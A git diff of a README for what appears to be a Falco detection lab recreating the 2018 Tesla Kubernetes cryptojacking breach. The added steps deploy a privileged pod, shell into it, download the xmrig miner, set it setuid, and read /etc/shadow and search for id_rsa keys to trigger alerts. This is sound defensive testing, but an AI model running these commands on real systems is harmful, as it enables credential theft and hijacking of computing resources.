@@ -139,13 +139,12 @@ kubectl get pods -n falco -o wide -w
 
 To test the IDS/SOC tool, I peform one insecure behaviour in ```tab1``` while also check for the Falco log event in ```tab2```:
 ```
-sudo cat /etc/shadow > /dev/null
-sudo journalctl _COMM=falco -p warning
+kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'tesla-app'
 ```
-```
-find /root -name "id_rsa"
-sudo grep falco /var/log/syslog | grep Warning
-```
+
+<img width="1437" alt="Screenshot 2023-10-22 at 13 54 45" src="https://github.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/assets/126002808/53c5f3b3-d4c7-4570-b17e-3b1737fc9441">
+
+If you look at the above screenshot, we created a new workload called ```tesla-app```, I've terminal shelled into the workload, and I've the real-time live tail of security incidents showing in terminal 2 window - providing the IDS system works.
 
 #### Supporting documentation for Falco event collect from Kubernetes and Cloud
 
@@ -165,4 +164,35 @@ https://falco.org/docs/install-operate/third-party/learning/
 Create an insecure containerized workload with ```privileged=true``` to give unrestricted permissions for the miner:
 ```
 kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/2018-Tesla-Data-Breach/main/tesla-app.yaml
+```
+
+The adversaries would have terminal shelled into the above workload in order to install the cryptominer.
+```
+kubectl exec -it tesla-app -- bash
+```
+
+Download the ```xmrig``` mining package from the official Github project:
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+Unzipping the mining binary package
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+Changing directory to the newly-downloaded miner folder
+```
+cd xmrig-6.16.4
+```
+
+Elevating permissions
+```
+chmod u+s xmrig
+```
+
+Finding credentials while we are in the container:
+```
+sudo cat /etc/shadow > /dev/null
+find /root -name "id_rsa"
 ```
